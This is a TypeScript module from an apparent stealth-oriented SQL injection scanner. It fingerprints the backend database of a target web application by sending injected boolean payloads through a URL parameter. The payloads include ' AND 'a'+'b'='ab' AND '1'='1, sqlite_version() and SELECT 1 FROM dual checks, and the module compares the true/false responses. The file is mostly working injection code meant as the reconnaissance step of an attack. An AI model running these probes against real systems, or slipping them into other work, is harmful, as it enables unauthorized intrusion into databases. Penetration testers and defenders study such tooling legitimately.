/**
 * SOHE God Rail v3 — Single-Probe Polyglot Fingerprinter
 *
 * Implements differential, non-destructive dialect resolution in 1–2 requests.
 * Instead of sequentially probing for each database engine, it leverages
 * SQL dialect syntax divergence (string concatenation, dialect-specific built-in functions,
 * comments, and dual tables) to pinpoint the exact DBMS engine in a single probe.
 */

import { DbmsType, ConfidenceLevel } from '../../../types/sqlScanner';
import { GhostNetwork, GhostHttpRequest } from '../stealth/GhostNetwork';
import { AdaptiveResponseOracle } from './AdaptiveResponseOracle';
import { StrategyContext } from './StrategyPlanner';

export interface PolyglotResult {
  detectedDbms: DbmsType;
  confidence: ConfidenceLevel;
  technique: 'differential_concat' | 'function_divergence' | 'error_signature' | 'fallback';
  evidence: string;
}

export class PolyglotFingerprinter {
  private network: GhostNetwork;
  private oracle: AdaptiveResponseOracle;

  constructor(network: GhostNetwork, oracle: AdaptiveResponseOracle) {
    this.network = network;
    this.oracle = oracle;
  }

  /**
   * Executes a single polyglot probe to differentiate MySQL, PostgreSQL, MSSQL, Oracle, and SQLite.
   *
   * Dialect Concatenation & Function Differences:
   * - MySQL:      'a' 'b' = 'ab' (whitespace concat) AND connection_id() IS NOT NULL
   * - PostgreSQL: 'a'||'b' = 'ab' AND version() LIKE '%PostgreSQL%'
   * - MSSQL:      'a'+'b' = 'ab' AND @@VERSION LIKE '%Microsoft%'
   * - SQLite:     'a'||'b' = 'ab' AND sqlite_version() IS NOT NULL
   * - Oracle:     'a'||'b' = 'ab' AND (SELECT 1 FROM dual) = 1
   */
  async resolveDialect(ctx: StrategyContext, quoteChar: string = "'"): Promise<PolyglotResult> {
    // Probe 1: Check concatenation syntax operator
    // String test: quote + operator + quote
    // e.g. '||'1'='1 vs '+'1'='1 vs ' '1'='1
    const concatProbe = await this.testConcatOperators(ctx, quoteChar);
    if (concatProbe) {
      return concatProbe;
    }

    // Probe 2: Diagnostic differential built-in functions via conditional true test
    const functionProbe = await this.testDifferentialFunctions(ctx, quoteChar);
    if (functionProbe) {
      return functionProbe;
    }

    return {
      detectedDbms: 'Generic SQL',
      confidence: 'Low',
      technique: 'fallback',
      evidence: 'Polyglot dialect resolution returned default generic SQL profile',
    };
  }

  /**
   * Tests concatenation operators:
   * - '+' -> MSSQL
   * - ' ' (whitespace) -> MySQL
   * - '||' -> PostgreSQL, SQLite, Oracle
   */
  private async testConcatOperators(
    ctx: StrategyContext,
    quote: string
  ): Promise<PolyglotResult | null> {
    // 1. Test '+' concat (MSSQL signature)
    // Payload: ' AND 'a'+'b'='ab' AND '1'='1
    const mssqlPayload = `${quote} AND ${quote}a${quote}+${quote}b${quote}=${quote}ab${quote} AND ${quote}1${quote}=${quote}1`;
    const mssqlRes = await this.sendProbe(ctx, mssqlPayload);
    if (this.oracle.isTrue(mssqlRes).isTrue) {
      return {
        detectedDbms: 'Microsoft SQL Server',
        confidence: 'High',
        technique: 'differential_concat',
        evidence: "Evaluated '+' string concatenation operator as true",
      };
    }

    // 2. Test whitespace concat (MySQL signature)
    // Payload: ' AND 'a' 'b'='ab' AND '1'='1
    const mysqlPayload = `${quote} AND ${quote}a${quote} ${quote}b${quote}=${quote}ab${quote} AND ${quote}1${quote}=${quote}1`;
    const mysqlRes = await this.sendProbe(ctx, mysqlPayload);
    if (this.oracle.isTrue(mysqlRes).isTrue) {
      return {
        detectedDbms: 'MySQL',
        confidence: 'High',
        technique: 'differential_concat',
        evidence: "Evaluated whitespace string concatenation ('a' 'b' = 'ab') as true",
      };
    }

    // 3. Test '||' concat (PostgreSQL / SQLite / Oracle signature)
    // Payload: ' AND 'a'||'b'='ab' AND '1'='1
    const pipePayload = `${quote} AND ${quote}a${quote}||${quote}b${quote}=${quote}ab${quote} AND ${quote}1${quote}=${quote}1`;
    const pipeRes = await this.sendProbe(ctx, pipePayload);
    if (this.oracle.isTrue(pipeRes).isTrue) {
      // Differentiate between SQLite, PostgreSQL, and Oracle
      return await this.differentiatePipeDialects(ctx, quote);
    }

    return null;
  }

  /**
   * Disambiguates between PostgreSQL, SQLite, and Oracle (which all use '||' for concat).
   */
  private async differentiatePipeDialects(
    ctx: StrategyContext,
    quote: string
  ): Promise<PolyglotResult> {
    // Test SQLite: sqlite_version()
    const sqlitePayload = `${quote} AND (SELECT sqlite_version()) IS NOT NULL AND ${quote}1${quote}=${quote}1`;
    const sqliteRes = await this.sendProbe(ctx, sqlitePayload);
    if (this.oracle.isTrue(sqliteRes).isTrue) {
      return {
        detectedDbms: 'SQLite',
        confidence: 'Confirmed',
        technique: 'function_divergence',
        evidence: 'sqlite_version() evaluated successfully',
      };
    }

    // Test PostgreSQL: version() and current_database()
    const pgPayload = `${quote} AND (SELECT version()) LIKE ${quote}%PostgreSQL%${quote} AND ${quote}1${quote}=${quote}1`;
    const pgRes = await this.sendProbe(ctx, pgPayload);
    if (this.oracle.isTrue(pgRes).isTrue) {
      return {
        detectedDbms: 'PostgreSQL',
        confidence: 'Confirmed',
        technique: 'function_divergence',
        evidence: 'version() confirmed PostgreSQL signature',
      };
    }

    // Test Oracle: dual table requirement
    const oraclePayload = `${quote} AND (SELECT 1 FROM dual) = 1 AND ${quote}1${quote}=${quote}1`;
    const oracleRes = await this.sendProbe(ctx, oraclePayload);
    if (this.oracle.isTrue(oracleRes).isTrue) {
      return {
        detectedDbms: 'Oracle',
        confidence: 'Confirmed',
        technique: 'function_divergence',
        evidence: 'SELECT FROM dual evaluated successfully',
      };
    }

    return {
      detectedDbms: 'PostgreSQL',
      confidence: 'Medium',
      technique: 'fallback',
      evidence: "Verified '||' concatenation; defaulting to PostgreSQL dialect",
    };
  }

  /**
   * Diagnostic fallback testing functions directly if concatenation syntax is filtered.
   */
  private async testDifferentialFunctions(
    ctx: StrategyContext,
    quote: string
  ): Promise<PolyglotResult | null> {
    // MySQL connection_id()
    const mySqlFn = `${quote} AND connection_id() > 0 AND ${quote}1${quote}=${quote}1`;
    const resMySQL = await this.sendProbe(ctx, mySqlFn);
    if (this.oracle.isTrue(resMySQL).isTrue) {
      return {
        detectedDbms: 'MySQL',
        confidence: 'High',
        technique: 'function_divergence',
        evidence: 'connection_id() evaluated successfully',
      };
    }

    // MSSQL @@SPID
    const msSqlFn = `${quote} AND @@SPID > 0 AND ${quote}1${quote}=${quote}1`;
    const resMSSQL = await this.sendProbe(ctx, msSqlFn);
    if (this.oracle.isTrue(resMSSQL).isTrue) {
      return {
        detectedDbms: 'Microsoft SQL Server',
        confidence: 'High',
        technique: 'function_divergence',
        evidence: '@@SPID evaluated successfully',
      };
    }

    return null;
  }

  private async sendProbe(ctx: StrategyContext, payload: string) {
    const req: GhostHttpRequest = JSON.parse(JSON.stringify(ctx.baseRequest));
    const url = new URL(req.url);
    url.searchParams.set(ctx.parameterName, `${ctx.originalValue}${payload}`);
    req.url = url.toString();
    return await this.network.executeRequest(req);
  }
}
